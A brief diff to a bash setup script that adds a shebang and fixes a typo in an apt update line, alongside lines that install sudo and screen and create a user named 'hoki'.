@@ -1,4 +1,5 @@
-0apt update
+#!/bin/bash
+apt update
 apt install sudo
 apt install screen -y
 sudo useradd -m hoki
